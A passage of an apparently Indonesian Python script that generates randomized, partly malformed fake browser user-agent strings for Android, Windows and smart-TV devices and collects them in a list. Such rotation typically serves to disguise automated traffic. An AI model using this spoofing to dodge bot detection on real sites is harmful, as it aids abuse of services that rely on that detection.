	c=random.choice(['X11; CrOS aarch64 15183.78.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/108.0.5359.172 Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	#Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36
	
	aa='Mozilla/5.0 (Linux; Android 12; SM-A135F;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 12; SM-A135F'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/108.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
	
	aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	#Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0
	aa='Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Android 10; Xiaomi Redmi Note 9 Pro Max'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/109.0.0.0 Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	#Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='like Gecko'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
	aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0; Win64; x64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50
	
	aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0; Win64; x64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
	
	
	aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0; Win64; x64; rv:108.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Gecko/20100101 Firefox/108.0'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	#Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 6.0.1; SM-G532G Build/MMB29T'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/63.0.3239.83 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
	
	aa='Mozilla/5.0 (Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 12; SAMSUNG SM-G991B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv Safari/538.1
	aa='Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SMART-TV; Linux; Tizen 2.4.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/1.1 tv Safari/538.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
   
   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
	aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
	aa='Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
   
	aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36
	aa='Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 11; SAMSUNG SM-A515F'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
   
   #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
	aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
   
   #NEW#AGENT
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='RMX2185 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=' 4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 '
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (SMART-TV;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Linux; Tizen 2.4.0)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/538.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 10; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Aquaris X2 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Versi/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9 .3'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Lenovo TB-X605L Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='PKQ1.190319.001 ) AppleWebKit/537.36 (KHTML, seperti Gecko) JioBrowser/1.4.7 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='74.0.3729.136 Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	#
	
	aa='Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['vivo Xplay5A Build/LMY47V)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.30 (KHTML, seperti Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Versi/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Win64; x64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 9 Pro)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
